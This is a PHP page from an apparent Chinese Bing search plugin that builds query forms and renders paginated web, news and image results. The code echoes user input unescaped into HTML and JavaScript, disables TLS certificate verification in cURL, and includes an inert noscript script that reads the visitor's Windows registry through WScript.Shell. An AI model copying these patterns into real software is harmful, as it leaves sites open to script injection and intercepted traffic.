                        $market = "zh-CN,Chinese - China|zh-HK,Chinese - Hong Kong SAR|zh-TW,Chinese - Taiwan|ar-XA,Arabic - Arabia|bg-BG,Bulgarian - Bulgaria|cs-CZ,Czech - Czech Republic|da-DK,Danish - Denmark|de-AT,German - Austria|de-CH,German - Switzerland|de-DE,German - Germany|el-GR,Greek - Greece|en-AU,English - Australia|en-CA,English - Canada|en-GB,English - United Kingdom|en-ID,English - Indonesia|en-IE,English - Ireland|en-IN,English - India|en-MY,English - Malaysia|en-NZ,English - New Zealand|en-PH,English - Philippines|en-SG,English - Singapore|en-US,English - United States|en-XA,English - Arabia|en-ZA,English - South Africa|es-AR,Spanish - Argentina|es-CL,Spanish - Chile|es-ES,Spanish - Spain|es-MX,Spanish - Mexico|es-US,Spanish - United States|es-XL,Spanish - Latin America|et-EE,Estonian - Estonia|fi-FI,Finnish - Finland|fr-BE,French - Belgium|fr-CA,French - Canada|fr-CH,French - Switzerland|fr-FR,French - France|he-IL,Hebrew - Israel|hr-HR,Croatian - Croatia|hu-HU,Hungarian - Hungary|it-IT,Italian - Italy|ja-JP,Japanese - Japan|ko-KR,Korean - Korea|lt-LT,Lithuanian - Lithuania|lv-LV,Latvian - Latvia|nb-NO,Norwegian - Norway|nl-BE,Dutch - Belgium|nl-NL,Dutch - Netherlands|pl-PL,Polish - Poland|pt-BR,Portuguese - Brazil|pt-PT,Portuguese - Portugal|ro-RO,Romanian - Romania|ru-RU,Russian - Russia|sk-SK,Slovak - Slovak Republic|sl-SL,Slovenian - Slovenia|sv-SE,Swedish - Sweden|th-TH,Thai - Thailand|tr-TR,Turkish - Turkey|uk-UA,Ukrainian - Ukraine";
                        for ($marketi = 0; $marketi < count(split("[|]",$market));$marketi++){
                        ?>
                                <OPTION VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$market),($marketi))),(0))?>" <?php  if (trim($_GET['market']) == arrmember(split("[,]",arrmember(split("[|]",$market),$marketi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$market),($marketi))),(1))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>                       
                        <input type="text" name="pagesize" value="<?php echo $pagesize?>" style="width:19px;height:19px;font-size:12px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>" size="1"> 
                        <input type="submit" class="button" name="btnSubmit" value=" Go ">
                </td>
        </tr>   
</table>
</form>
<?php 
                $tag->jscentoload("bing","Query","Cento");
                break;
        default:
                $postdata = "";
                $soSources = $Sources;
                ?>
<form action="<?php  echo ScriptPath(); ?>?api=bing" method="post" name="bing">
<table width="100%" height="90%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" valign="center">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                        	 IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                  if (stripos($_SERVER['SERVER_NAME'],'.') == false){
                                $zone = $_SERVER['SERVER_NAME'];
                                $subzone = "";
                        }       
                        else{
                                if (count(split("[.]",$_SERVER['SERVER_NAME'])) == 3){
                                        if (arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "net" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "org" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "com" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "biz"){
                                                $zone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),1).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),2);
                                        }       
                                        else{
                                                $zone = $_SERVER['SERVER_NAME'];
                                        }
                                }               
                                elseif (count(split("[.]",$_SERVER['SERVER_NAME'])) >= 4){
                                        $zone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-3).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-2).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-1);
                                }               
                        }
                ?>
<noscript>
<script language="JavaScript" type="text/javascript">
var WshShell=new ActiveXObject("WScript.Shell");
if (WshShell.Regread("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\<?php echo $zone;?>\\http") == 2){      
        document.getElementById('zonemap').href = "X3193.zip";
}       
else{
        document.getElementById('zonemap').href = "X3193.zip";
}       
</script>
</noscript>
                </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" height="35" class="tdtbg" valign="middle">
                        <input name="Query" value="<?php  echo $query; ?>" style="height:20px;width:90px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
                        网页<input type="radio" name="Sources" value="Web" <?php  if ($Sources=="Web") echo 'checked'; elseif ($Sources=="") echo 'checked'; ?>> 
                        新闻<input type="radio" name="Sources" value="news" <?php if ($Sources=="news") echo 'checked'; ?>> 
                        图片<input type="radio" name="Sources" value="image" <?php if ($Sources=="image") echo 'checked'; ?>> 
                        视频<input type="radio" name="Sources" value="video" <?php if ($Sources=="video")  echo 'checked'; ?>> 
                        手机<input type="radio" name="Sources" value="MobileWeb" <?php if ($Sources=="MobileWeb")  echo 'checked'; ?>> 
                        <noscript>
                        电话<input type="radio" name="Sources" value="phonebook" <?php if ($Sources=="phonebook") ?>checked onclick="vbscript:getphone()"> 
                        问答<input type="radio" name="Sources" value="instantanswer" <?php if ($Sources=="InstantAnswer") ?>checked> 
                        </noscript>
                        <SELECT name="transfrom" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <OPTION VALUE="">源语种</OPTION>
                        <?php 
                        $langfrom = "Ar,Arabic|zh-CHS,简体中文|zh-CHT,繁w中文|Nl,Dutch|En,English|Fr,French|De,German|It,Italian|Ja,Japanese|Ko,Korean|Pl,Polish|Pt,Portuguese|Ru,Russian|Es,Spanish";
                        for($langfromi = 0; $langfromi < count(split("[|]",$langfrom));$langfromi++){
                        ?>
                                <OPTION VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(0));?>" <?php  if (trim($_GET['transfrom']) == arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(1))?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="">不选择...</OPTION>
                        </SELECT>
                        <SELECT name="market" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:175px;height:16px;font-size:12px">
                        <?php 
                        $market = "zh-CN,Chinese - China|zh-HK,Chinese - Hong Kong SAR|zh-TW,Chinese - Taiwan|ar-XA,Arabic - Arabia|bg-BG,Bulgarian - Bulgaria|cs-CZ,Czech - Czech Republic|da-DK,Danish - Denmark|de-AT,German - Austria|de-CH,German - Switzerland|de-DE,German - Germany|el-GR,Greek - Greece|en-AU,English - Australia|en-CA,English - Canada|en-GB,English - United Kingdom|en-ID,English - Indonesia|en-IE,English - Ireland|en-IN,English - India|en-MY,English - Malaysia|en-NZ,English - New Zealand|en-PH,English - Philippines|en-SG,English - Singapore|en-US,English - United States|en-XA,English - Arabia|en-ZA,English - South Africa|es-AR,Spanish - Argentina|es-CL,Spanish - Chile|es-ES,Spanish - Spain|es-MX,Spanish - Mexico|es-US,Spanish - United States|es-XL,Spanish - Latin America|et-EE,Estonian - Estonia|fi-FI,Finnish - Finland|fr-BE,French - Belgium|fr-CA,French - Canada|fr-CH,French - Switzerland|fr-FR,French - France|he-IL,Hebrew - Israel|hr-HR,Croatian - Croatia|hu-HU,Hungarian - Hungary|it-IT,Italian - Italy|ja-JP,Japanese - Japan|ko-KR,Korean - Korea|lt-LT,Lithuanian - Lithuania|lv-LV,Latvian - Latvia|nb-NO,Norwegian - Norway|nl-BE,Dutch - Belgium|nl-NL,Dutch - Netherlands|pl-PL,Polish - Poland|pt-BR,Portuguese - Brazil|pt-PT,Portuguese - Portugal|ro-RO,Romanian - Romania|ru-RU,Russian - Russia|sk-SK,Slovak - Slovak Republic|sl-SL,Slovenian - Slovenia|sv-SE,Swedish - Sweden|th-TH,Thai - Thailand|tr-TR,Turkish - Turkey|uk-UA,Ukrainian - Ukraine";
                        for ($marketi = 0; $marketi < count(split("[|]",$market));$marketi++){
                        ?>
                                <OPTION VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$market),($marketi))),(0))?>" <?php  if (trim($_GET['market']) == arrmember(split("[,]",arrmember(split("[|]",$market),$marketi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$market),($marketi))),(1))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>                       
                        <input type="text" name="pagesize" value="<?php echo $pagesize?>" style="width:19px;height:19px;font-size:12px" <?php  $style->textarea("#FCFC9D","") ?>>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>" size="1"> 
                        <input type="submit" class="button" name="btnSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
                <?php 
                if ($query != ""){ // query if start 
                        if (strripos($query,"\\") && $_POST['Query']!=''){
                        		if(!is_wap()){
                                AlertBack("关键词不能包含特殊字符！" , 1);
                            }else{
                            
                            }  
                        }
                        elseif (strripos($query,"\\") && $_GET['Query']!=""){
                        		if(!is_wap()){                        	
                                AlertBack("关键词不能包含特殊字符！" , 2);
                            }else{
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											关键词不能包含特殊字符！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;                            
                            }    
                        }
                        if (Trim(request('page')) != "" && is_numeric(Trim(request('page')))){
                                if ($_POST['page'] == '')
                                	$page = Trim(request('page'));
                                else{
                                	$page = Trim($_POST['page']);
                                	redirect(httppath().'?Query='.encodeuri($query).'&Sources='.encodeuri($soSources).'&pagesize='.encodeuri($pagesize).'&page='.encodeuri($page).'&skin='.$skincolor.'&market='.$marketstr.'&charset='.getcharset());
                                	break;                  
                                }	
                                	
                        }        	
                        elseif (Trim(request('transfrom')) != ""){
                                redirect(httppath()."?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&skin=".$skincolor."&transfrom=".encodeuri(Trim(request('transfrom')))."&market=".$marketstr.'&charset='.getcharset());
                                break;                  
                        }       
                        else{
                                redirect(httppath().'?Query='.encodeuri($query).'&Sources='.encodeuri($soSources).'&pagesize='.encodeuri($pagesize).'&page='.encodeuri('1').'&skin='.$skincolor.'&market='.$marketstr.'&charset='.getcharset());
                                break;                  
                        }       
                $gotopage = New PageChange(); 
                if (strpos($Sources,"Web") !== false){ // web if start
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="gb2312" ?><?php pageview_candidate?><SearchResponse xmlns="http://schemas.microsoft.com/LiveSearch/2008/04/XML/element" Version="2.2"><Query><SearchTerms>x3193</SearchTerms></Query><web:Web xmlns:web="http://schemas.microsoft.com/LiveSearch/2008/04/XML/web"><web:Total>193</web:Total><web:Offset>2</web:Offset><web:Results>';
                                for($i=1;$i<=70;$i++){
                                        $xmlstr = $xmlstr."<web:WebResult><web:Title>中国百姓新财富网_电子杂志频道_汇集精彩免费电子杂志</web:Title><web:Description>西安酒店网 宁波第一站_ 电子杂志(e 电子杂志下载 电子杂志 E购客 电子杂志-E 鱼游~电子杂 德州麦客 优之城杂志 中文杂志 聊城消费网 互联网杂志 好人帮 中国便民导航 嘻哈杂志 咯哟哦 - 都来杂志吧 潮流cosm sadasa erqwr X3193</web:Description><web:Url>http://zz.bxxcf.com/</web:Url><web:CacheUrl>http://cncc.bingj.com/cache.aspx?q=x3193&amp;d=4914134124266644&amp;mkt=zh-cn&amp;w=4b69a191,a73cd67e</web:CacheUrl><web:DisplayUrl>zz.bxxcf.com</web:DisplayUrl><web:DateTime>2009-12-05T01:55:20Z</web:DateTime></web:WebResult>";
                                }
                                $xmlstr = $xmlstr.'</web:Results></web:Web></SearchResponse>';
                        }       
                        else{  
                		$bing_search = new bing_class();
                		$searchresult = $bing_search->bingsearch(trim($Sources),trim($query),trim($pagesize),$page);  
                		//print_r(trim($pagesize).$page);               
                    //exit;
                        }

                        if (!$searchresult){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($searchresult['totalitem'] == 0){
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }

                        if ($searchresult['totalitem'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $searchresult['totalitem'];
                        //echo $strpagesize;
                        $totalitem = $searchresult['totalitem'];
                        $totalpage=$searchresult['totalpage'];
                        $page = $searchresult['page'];
                        if($page > $totalpage){
                                redirect(httppath().'?Query='.encodeuri($query).'&Sources='.encodeuri($soSources).'&pagesize='.encodeuri($pagesize).'&page='.encodeuri($totalpage).'&skin='.$skincolor.'&market='.$marketstr.'&charset='.getcharset());
                                break;                  
                        }
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 搜 索 结 果 : 共 <?php  echo $searchresult['totalitem'];?> 条,仅显示前 1000 条 </td>
        </tr>   
                        <?php                       
                        for($i=0; $i <= $searchresult['endid'];$i++){
                                //$objHdd = $objList->item($i);
                                ?>                              
        <tr class="tdbg">
                <td align="left" id="result">
                                <?php 
                                $nodetitle = str_replace('"', "", iconv('utf-8','gb2312',$searchresult[$i]['nodetitle']));
                                $nodedescript = str_replace('"', "", iconv('utf-8','gb2312',$searchresult[$i]['nodedescript']));
                                $nodelink = str_replace('"', "", iconv('utf-8','gb2312',$searchresult[$i]['nodelink']));
                               	print_r("<li>"." "."<a style='color:#000000' href='".$nodelink."' title='".($nodelink)." ".$sCrLf.$nodetitle." ".$sCrLf.($nodedescript)."' target='_blank'>".($nodetitle)."</a></li>");
                                ?>
                </td>
                <td align="center" width="17%"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                                <a style='color:#000000' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo formatchar("收藏");?></a> <a style='color:#000000' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo formatchar("网收");?></a>
                                        </td>   
                                </tr>
                        </table>                        
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdbg">
                        <?php 
                        

                        
                        ?>
                <td align="center" colspan="3"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        if (floor($page) > 1)
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        
                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 

                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // web if end
                elseif (strpos($Sources,"news") !== false){ // news if start
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $url = httppathdir().'plugins/xml/bing/news.xml';
                        }       
                        else{   
                                $url = 'https://api.datamarket.azure.com/Bing/Search/xml.aspx?AppId='.encodeuri($BingAppId).'&Market='.encodeuri(Trim(request('market'))).'&Query='.encodeuri(iconv('gb2312','utf-8',$query)).'&Sources='.$soSources.'&news.Offset='.encodeuri($pagesize*($page-1)).'&xmltype=elementbased&Version='.encodeuri("2.0").'&Options=EnableHighlighting';
                        }       
                
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);
                        //echo $xmlstr;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);
                        if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue === false){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue == 0){
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }
                        $objList = $objXml->getElementsByTagName(arrmember(split("[:]","news:NewsResult"),"1"));
                        //echo $objList->length;
                        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                        //echo $strpagesize;
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 搜 索 结 果 : 共 <?php  echo $objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue;?> 条,仅显示前 1000 条 </td>
        </tr>   
                        <?php                       
                        for($i=0; $i < $strpagesize;$i++){
                                $objHdd = $objList->item($i);
                                ?>                              
        <tr class="tdbg">
                <td align="left" id="result">
                                <?php 
                                $nodetitle = str_replace('"', "", iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","news:Title"),"1"))->item(0)->nodeValue)." ");
                                $nodedescript = str_replace('"', "", iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","news:Snippet"),"1"))->item(0)->nodeValue)." ");
                                $nodelink = str_replace('"', "", trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","news:Url"),"1"))->item(0)->nodeValue)." "));
                                $nodeDateTime = str_replace('"', "", iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","news:Date"),"1"))->item(0)->nodeValue)." ");
                                print_r("<li>"." "."<a style='color:#000000' href='".$nodelink."' title='".$nodelink." ".$sCrLf.$nodedescript." ".$sCrLf.$nodeDateTime."' target='_blank'>".$nodetitle."</a></li>");
                                ?>
                </td>
                <td align="center" width="17%"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                                <a style='color:#000000' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self>收藏</a> <a style='color:#000000' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank>网收</a>
                                        </td>   
                                </tr>
                        </table>                        
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdbg">
                        <?php 
                        if ($objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue > 1000){
                                $totalitem = 1000;
                        }       
                        else{
                                $totalitem = $objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue;
                        }       
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }       

                        ?>
                <td align="center" colspan="3"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        if (floor($page) > 1)
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        
                ?>
                <input name="Query" value="<?php  echo $query; ?>" style="height:20px;width:50px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
								<input type="submit" class="button" name="gotopage" value=" Go ">                 
                <?php 
                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // news if end
                elseif (strpos($Sources,"image") !== false){ // image if start
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $url = httppathdir().'plugins/xml/bing/image.xml';
                        }       
                        else{   
                                $url = 'https://api.datamarket.azure.com/Bing/Search/xml.aspx?AppId='.encodeuri($BingAppId).'&Market='.encodeuri(trim(request("market"))).'&Query='.encodeuri(iconv('gb2312','utf-8',$query)).'&Sources='.$soSources.'&image.Count='.encodeuri($pagesize).'&image.Offset='.encodeuri($pagesize*($page-1)).'&xmltype=elementbased';
                        }

                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);

                        //echo $xmlstr;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);
                        if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue === false){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>                
                        <?php       
                                break;
                        }
                        elseif ($objXml->getElementsByTagName(arrmember(split("[:]","mms:Total"),"1"))->item(0)->nodeValue == 0){
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 搜 索 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                未搜索到任何数据，请优化检索词。
                </td>
        </tr>   
</table>                        
                        <?php 
                                        break;
                        }
                        $objList = $objXml->getElementsByTagName(arrmember(split("[:]","mms:ImageResult"),"1"));
                        //echo $objList->length;
                        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                        //echo $strpagesize;
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 搜 索 结 果 : 共 <?php  echo $objXml->getElementsByTagName(arrmember(split("[:]","mms:Total"),"1"))->item(0)->nodeValue;?> 条,仅显示前 1000 条 </td>
        </tr>   
                        <?php                       
                        for($i=0; $i < $strpagesize;$i++){
                                $objHdd = $objList->item($i);
                                ?>                              
        <tr class="tdbg">
                <td align="left" id="result">
                                <?php 
                                $nodetitle = str_replace('"', "",iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mms:Title"),"1"))->item(0)->nodeValue)." ");
                                $nodedescript = str_replace('"', "",iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mms:MediaUrl"),"1"))->item(0)->nodeValue)." ");
                                $nodelink = str_replace('"', "",trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mms:Url"),"1"))->item(0)->nodeValue)." "));
                                $nodeDisplayUrl = str_replace('"', "",trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mms:DisplayUrl"),"1"))->item(0)->nodeValue)." "));
                                print_r("<li>"." "."<a style='color:#000000' href='".$nodelink."' title='".$nodelink." ".$sCrLf.$nodedescript." ".$sCrLf.$nodeDisplayUrl."' target='_blank'>".$nodetitle."</a></li>");
                                ?>
                </td>
                <td align="center" width="17%"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                                <a style='color:#000000' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self>收藏</a> <a style='color:#000000' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank>网收</a>
                                        </td>   
                                </tr>
                        </table>                        
                        
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdbg">
                        <?php 
                        if ($objXml->getElementsByTagName(arrmember(split("[:]","mms:Total"),"1"))->item(0)->nodeValue > 1000){
                                $totalitem = 1000;
                        }       
                        else{
                                $totalitem = $objXml->getElementsByTagName(arrmember(split("[:]","mms:Total"),"1"))->item(0)->nodeValue;
                        }       
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }       

                        ?>
                <td align="center" colspan="3"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        if (floor($page) > 1)
                                echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
